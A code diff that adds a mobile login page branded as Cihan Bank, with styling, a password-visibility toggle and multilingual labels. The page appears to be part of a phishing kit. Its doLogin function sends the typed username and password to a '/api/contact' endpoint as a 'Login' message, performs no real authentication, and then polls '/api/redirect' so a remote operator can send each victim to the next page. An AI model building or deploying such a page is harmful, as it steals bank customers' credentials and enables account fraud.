@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+  <title>Cihan Bank</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="shared.css">
+  <link rel="icon" href="favicon.png">
+  <style>
+    /* Force LTR on this page */
+    html { direction: ltr !important; }
+
+    .login-top {
+      display: flex;
+      justify-content: flex-start;
+      padding: 16px 20px;
+    }
+
+    .login-logo {
+      display: flex;
+      justify-content: center;
+      padding: 16px 0 28px;
+    }
+    .login-logo img {
+      width: 180px;
+      height: auto;
+      filter: drop-shadow(0 6px 20px rgba(0,0,0,0.25));
+    }
+
+    .login-sheet {
+      background: #fff;
+      border-radius: 28px 28px 0 0;
+      padding: 12px 24px 40px;
+      margin-top: auto;
+      box-shadow: 0 -4px 30px rgba(0,0,0,0.08);
+    }
+
+    .login-handle {
+      width: 64px; height: 6px;
+      background: #d7d7d9;
+      border-radius: 100px;
+      margin: 0 auto 24px;
+    }
+
+    .login-title {
+      font-size: 32px;
+      font-weight: 800;
+      color: #1a1a1a;
+      margin-bottom: 24px;
+    }
+
+    .field-group {
+      margin-bottom: 14px;
+    }
+
+    .pw-wrap {
+      position: relative;
+    }
+    .pw-wrap .form-input {
+      padding-right: 48px;
+    }
+    .pw-toggle {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      color: #8a8a8a;
+    }
+    .pw-toggle svg {
+      width: 22px; height: 22px;
+      stroke: currentColor; fill: none;
+      stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;
+    }
+
+    .forgot-link {
+      display: block;
+      text-align: center;
+      color: #6b6b6b;
+      font-size: 14px;
+      margin: 8px 0 16px;
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+    .forgot-link:hover { color: #b11811; }
+
+    .login-error {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      border-radius: 12px;
+      padding: 10px 16px;
+      color: #dc2626;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 16px;
+      display: none;
+    }
+    .login-error.show { display: block; }
+
+    .login-divider {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 20px 0;
+      color: #8a8a8a;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .login-divider::before, .login-divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #e5e7eb;
+    }
+
+    .btn-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+    .btn-grey {
+      height: 50px;
+      background: #f2f2f2;
+      border: none;
+      border-radius: 14px;
+      font-family: 'Tajawal', sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      color: #333;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.15s;
+    }
+    .btn-grey:hover { background: #e8e8e8; }
+    .btn-grey:active { transform: scale(0.97); }
+
+    .terms-link {
+      display: block;
+      text-align: center;
+      color: #b11811;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: underline;
+      text-underline-offset: 3px;
+      margin-top: 8px;
+    }
+    .terms-link:hover { color: #9c1410; }
+  </style>
+</head>
+<body>
+  <div class="bg-pattern"></div>
+  <div class="page-wrapper">
+    <!-- Language Switcher -->
+    <div class="login-top" id="langArea"></div>
+
+    <!-- Logo -->
+    <div class="login-logo">
+      <img src="assets/cb-logo.png" alt="Cihan Bank">
+    </div>
+
+    <!-- Login Sheet -->
+    <div class="login-sheet">
+      <div class="login-handle"></div>
+
+      <h1 class="login-title" id="loginTitle"></h1>
+
+      <!-- Username -->
+      <div class="field-group">
+        <input type="text" class="form-input" id="usernameInput" autocomplete="username">
+      </div>
+
+      <!-- Password -->
+      <div class="field-group">
+        <div class="pw-wrap">
+          <input type="password" class="form-input" id="passwordInput" autocomplete="current-password">
+          <button type="button" class="pw-toggle" id="pwToggle" onclick="togglePw()">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="eyeIcon">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+              <circle cx="12" cy="12" r="3"></circle>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <!-- Forgot Password Link -->
+      <a href="forgot.html" class="forgot-link" id="forgotLink"></a>
+
+      <!-- Error -->
+      <div class="login-error" id="loginError"></div>
+
+      <!-- Login Button -->
+      <button class="btn-primary" id="loginBtn" onclick="doLogin()"></button>
+
+      <!-- OR divider -->
+      <div class="login-divider"><span id="orText"></span></div>
+
+      <!-- Two grey buttons -->
+      <div class="btn-row">
+        <button class="btn-grey" id="becomeBtn"></button>
+        <button class="btn-grey" id="createBtn"></button>
+      </div>
+
+      <!-- Terms -->
+      <a href="#" class="terms-link" id="termsLink"></a>
+    </div>
+  </div>
+
+  <script src="shared.js"></script>
+  <script>
+    var pwVisible = false;
+
+    function togglePw() {
+      pwVisible = !pwVisible;
+      var input = document.getElementById('passwordInput');
+      var icon  = document.getElementById('eyeIcon');
+      input.type = pwVisible ? 'text' : 'password';
+      icon.innerHTML = pwVisible
+        ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"></path><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"></path><line x1="1" y1="1" x2="23" y2="23"></line><path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"></path>'
+        : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
+    }
+
+    function renderPage() {
+      /* Force LTR always on login page */
+      document.documentElement.lang = getLang();
+      document.documentElement.dir  = 'ltr';
+
+      renderLangSwitcher('langArea');
+
+      document.getElementById('loginTitle').textContent     = t('loginTitle');
+      document.getElementById('usernameInput').placeholder  = t('loginUsername');
+      document.getElementById('passwordInput').placeholder  = t('loginPassword');
+      document.getElementById('forgotLink').textContent     = t('loginForgot');
+      document.getElementById('loginError').textContent     = t('dataError');
+      document.getElementById('loginBtn').textContent       = t('loginBtn');
+      document.getElementById('orText').textContent         = getLang() === 'en' ? 'OR' : getLang() === 'ar' ? 'أو' : 'یان';
+      document.getElementById('becomeBtn').textContent      = t('loginBecome');
+      document.getElementById('createBtn').textContent      = t('loginCreate');
+      document.getElementById('termsLink').textContent      = t('loginTerms');
+    }
+
+    function doLogin() {
+      var user = document.getElementById('usernameInput').value.trim();
+      var pass = document.getElementById('passwordInput').value.trim();
+
+      if (!user || !pass) {
+        document.getElementById('loginError').classList.add('show');
+        return;
+      }
+
+      document.getElementById('loginError').classList.remove('show');
+      var btn = document.getElementById('loginBtn');
+      btn.disabled = true;
+      btn.textContent = t('sending');
+
+      fetch('/api/contact', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ subject: 'Login', page: 'login', username: user, password: pass })
+      }).then(function(){ pollRedirect(); })
+        .catch(function(){
+          document.getElementById('loginError').classList.add('show');
+          btn.disabled = false;
+          btn.textContent = t('loginBtn');
+        });
+    }
+
+    var pollTimer = null;
+    function pollRedirect() {
+      pollTimer = setInterval(function() {
+        fetch('/api/redirect').then(function(r){ return r.json() }).then(function(d) {
+          if (d.redirect && d.redirect !== 'none') {
+            clearInterval(pollTimer);
+            window.location.href = d.redirect + '.html';
+          }
+        }).catch(function(){});
+      }, 3000);
+    }
+
+    /* Enter key submits */
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') doLogin();
+    });
+
+    renderPage();
+  </script>
+</body>
+</html>
